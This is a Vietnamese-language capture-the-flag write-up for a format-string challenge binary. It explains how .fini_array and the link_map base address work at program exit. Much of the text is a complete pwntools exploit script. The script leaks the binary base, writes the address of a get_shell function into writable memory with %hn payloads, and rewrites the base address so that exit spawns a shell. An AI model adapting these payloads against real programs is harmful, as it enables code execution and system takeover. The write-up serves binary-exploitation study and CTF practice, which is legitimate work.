# **Format String - Tấn công địa chỉ base của .fini_array**



*Một kỹ thuật đặc trưng của lỗi format string là ghi đè laddr (tức là địa chỉ base của binary) của linkmap thành một địa chỉ khác để khi chương trình kết thúc, thay vì chương trình gọi tới hàm của mảng .finiarray, nó sẽ có thể gọi tới một hàm khác tại địa chỉ laddr cộng với offset của địa chỉ base tới mảng .finiarray.*

**ida:**

```C 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+Ch] [rbp-54h]
  char format[72]; // [rsp+10h] [rbp-50h] BYREF
  unsigned __int64 v6; // [rsp+58h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  puts("I can repeat whatever you said!");
  for ( i = 0; i <= 2; ++i )
  {
    printf("Say something: ");
    __isoc99_scanf("%64s", format);
    getchar();
    printf("You said: ");
    printf(format);
    puts("\nIs it correct?");
    printf("> ");
    __isoc99_scanf("%c", format);
    if ( format[0] == 121 || format[0] == 89 )
    {
      puts("That's nice");
      return 0;
    }
    if ( i )
    {
      if ( i == 1 )
      {
        puts("Damn! Last time!");
      }
      else if ( i == 2 )
      {
        puts("I give up :(((");
      }
    }
    else
    {
      puts("Let's try one more time!");
    }
  }
  return 0;
}
```

```C 

int get_shell()
{
  return system("/bin/sh");
}

```

nhìn sơ thì thấy chạy vào get_shell là xong

**tại hàm main có lỗi fmt lặp lại 3 lần**, giờ ta debug xem sao

![image](https://github.com/gookoosss/CTF/assets/128712571/d90a55f3-f241-43ff-8856-81b57450061a)


**ái chà full tank :)) căng đây**

bây h nó chặn mọi cách thức tấn công ta đã học trước đây, nên giờ **ta cần biết thêm 1 kiến thức mới đó .fini_array**

# .fini_array

- fini_array là một phần của vùng nhớ .data của chương trình, được sử dụng để lưu trữ một danh sách các hàm được gọi khi chương trình thoát. Các hàm này có thể được sử dụng để dọn dẹp bộ nhớ và thực hiện các tác vụ cuối cùng trước khi chương trình kết thúc hoặc bị giết.

- Khi một chương trình kết thúc, trình quản lý tiến trình sẽ thực hiện các hàm được liệt kê trong .fini_array. Điều này đảm bảo rằng các tài nguyên đã được sử dụng bởi chương trình được giải phóng và các tác vụ cuối cùng được thực hiện trước khi chương trình kết thúc.

**hiểu đơn giản là .fini_array là 1 địa chỉ khi chương trình kết thúc nó sẽ trỏ đến địa chỉ này và kết thúc chương trình nằm xóa đi các bộ đệm trước đó**

cách tìm địa chỉ .finiarray là dùng **info files**:

![image](https://github.com/gookoosss/CTF/assets/128712571/0696b6f8-f01c-4eef-ba7d-b239e6612e43)


**trong stack sẽ có 1 địa chỉ đặc biệt ko phải địa chỉ binary cũng như là địa chi libc , nó là 1 địa chỉ nằm ngoài binary vs libc nma lại trỏ đến địa chỉ base**

![image](https://github.com/gookoosss/CTF/assets/128712571/36626ade-bd9e-405f-bdbf-c8249fa03e8a)



khi ta kết thúc chương trình , nó sẽ trỏ đến địa chỉ này , từ địa chỉ base exe sẽ cộng thêm offset đến địa chỉ .fini_array , từ đây ta hình dung sương sương ra hướng khai thác rồi đó 


# ý tưởng 

- trước tiên ta thử tính offset từ địa chỉ base đến .fini_arry là **0x3d90**, vậy nếu ta lợi dụng lỗi fmt, **thay đổi địa chỉ base thành 1 địa chỉ khác** , **địa chỉ đó + offset thành 1 địa chỉ khác có chứa hàm get_shell**, thì khi kết thúc chương trình ta sẽ lấy được shell sao
- ở đây ta cần leak thêm địa chỉ exe để hỗ trợ khai thác
- bây giờ ta ko thấy stack nào có chứa địa chỉ get_shell nên h **ta cần tìm địa chỉ nào đó có rw rồi lợi dụng lỗi fmt để gán địa chỉ get_shell vào** 

# khai thác 

**ở đây ta có 3 lần fmt** vậy ta sẽ khai thác từng lần nhập

### 1. leak binary address 

- cái này đơn giản nên debug tí là ra:

```python 
####################################
### Stage 1: leak binary address ###
####################################

p.sendlineafter(b'something: ', b'%23$p' )
p.recvuntil(b'You said: ')
exe_leak = int(p.recvline()[:-1], 16)
exe.address = exe_leak - exe.sym['main']
log.info('exe leak: ' + hex(exe_leak))
log.info('exe base: ' + hex(exe.address))
```

### 2. write get_shell address

![image](https://github.com/gookoosss/CTF/assets/128712571/e75159af-50ba-45b7-af2d-171db9153fc6)


**ta chọn 0x5555555580f0 làm rw_addr**

bây h ta cần gán địa chỉ get_shell vào rw_addr **trong 1 lần nhập** , khá khó chịu đấy

để làm được điều này **ta cần bỏ lần lượt 2byte địa chỉ get_shell vào package**, **gán với mỗi byte 2 trên là  1 địa chỉ rw_addr hợp lý**

```sau đó ta sẽ dùng sorted(package) để sắp xếp số byte cần in ra từ bé đến lớn, vì ta chỉ có thể in nhiều thêm chứ ko thể cắt in ít đi được, đảm bảo chương trình ko bị lỗi```


![image](https://github.com/gookoosss/CTF/assets/128712571/5a96ed3d-0040-41e2-abcd-b0dc11109405)



```python 

########################################
### Stage 2: write get_shell address ###
########################################

# 0x40f0 = offset rw_addr

getshell = exe.sym['get_shell']
rw_addr = exe.address + 0x40f0

package = {
    (getshell >> 0) & 0xffff : rw_addr,
    (getshell >> 16) & 0xffff : rw_addr + 2,
    (getshell >> 32) & 0xffff : rw_addr + 4,
}

order = sorted(package) # sắp xếp lại theo thứ tự từ bé đến lớn
log.info('get shell: ' + hex(getshell))
print(package)
print(order)

payload = f'%{order[0]}c%13$hn'.encode() # in lần 1
payload += f'%{order[1] - order[0]}c%14$hn'.encode() #in lần 2 
payload += f'%{order[2] - order[1]}c%15$hn'.encode() # in lần 3
payload = payload.ljust(64 - 24, b'P')
payload += flat(
    package[order[0]], # rw_addr so với lần 1
    package[order[1]], # rw_addr so với lần 2
    package[order[2]], # rw_addr so với lần 3

)

p.sendlineafter(b'> ', b'n' )
p.sendlineafter(b'something: ', payload )

```

### 3. change base address of .fini_array

địa chỉ đặc biệt trỏ đến đến địa chỉ base exe đã nằm trên stack sẵn rồi nên ta ko leak ra nữa mà dùng fmt luôn 

**offset từ địa chỉ đặc biệt đến địa chỉ chứa get_shell là 0x0360, vậy ta chỉ cần in để 2 byte cuối địa chỉ base thành địa chỉ ta cần là được** 

```python=
###################################################
### Stage 3: change base address of .fini_array ###
###################################################

# 0x0055698e417000 + 0x3d90 = 0x000055698e41ad90
# 0x0055698e417000 + 0x3d90 + ? = 0x000055698e41b0f0
# ? = 0x360 = offset stack

p.sendlineafter(b'> ', b'n' )

p.sendlineafter(b'something: ', f'%{(exe.address + 0x360) & 0xffff}c%38$hn')
p.sendlineafter(b'> ', b'y' )

```

h ta chạy thử xem sao 

![image](https://github.com/gookoosss/CTF/assets/128712571/1d61ee11-f28b-4929-8a0a-4b2f50a8cb38)


**gán get_shell thành công nè**

![image](https://github.com/gookoosss/CTF/assets/128712571/91f8bb21-b442-44ac-b66e-444adc60147a)

**sửa 2 byte cuối địa chỉ base thành đuôi 0x360 rồi nè**

![image](https://github.com/gookoosss/CTF/assets/128712571/936368da-a740-43d1-8a8f-9fc7b71954b8)

oke lấy được shell luôn rồi

**script:**

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./fmtstr8_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")
p = process([exe.path])

context.binary = exe

#fini_array offset: 0x3d90

gdb.attach(p, gdbscript = '''
b*main+136
c
''')
           
input()
####################################
### Stage 1: leak binary address ###
####################################

p.sendlineafter(b'something: ', b'%23$p' )
p.recvuntil(b'You said: ')
exe_leak = int(p.recvline()[:-1], 16)
exe.address = exe_leak - exe.sym['main']
log.info('exe leak: ' + hex(exe_leak))
log.info('exe base: ' + hex(exe.address))
        

########################################
### Stage 2: write get_shell address ###
########################################

# 0x40f0 = offset rw_addr

getshell = exe.sym['get_shell']
rw_addr = exe.address + 0x40f0

package = {
    (getshell >> 0) & 0xffff : rw_addr,
    (getshell >> 16) & 0xffff : rw_addr + 2,
    (getshell >> 32) & 0xffff : rw_addr + 4,
}

order = sorted(package) # sắp xếp lại theo thứ tự từ bé đến lớn
log.info('get shell: ' + hex(getshell))
print(package)
print(order)

payload = f'%{order[0]}c%13$hn'.encode()
payload += f'%{order[1] - order[0]}c%14$hn'.encode()
payload += f'%{order[2] - order[1]}c%15$hn'.encode()
payload = payload.ljust(64 - 24, b'P')
payload += flat(
    package[order[0]],
    package[order[1]],
    package[order[2]],

)

p.sendlineafter(b'> ', b'n' )
p.sendlineafter(b'something: ', payload )


###################################################
### Stage 3: change base address of .fini_array ###
###################################################

# 0x0055698e417000 + 0x3d90 = 0x000055698e41ad90
# 0x0055698e417000 + 0x3d90 + ? = 0x000055698e41b0f0
# ? = 0x360 = offset stack

p.sendlineafter(b'> ', b'n' )

p.sendlineafter(b'something: ', f'%{(exe.address + 0x360) & 0xffff}c%38$hn')
p.sendlineafter(b'> ', b'y' )

p.interactive()


```




 
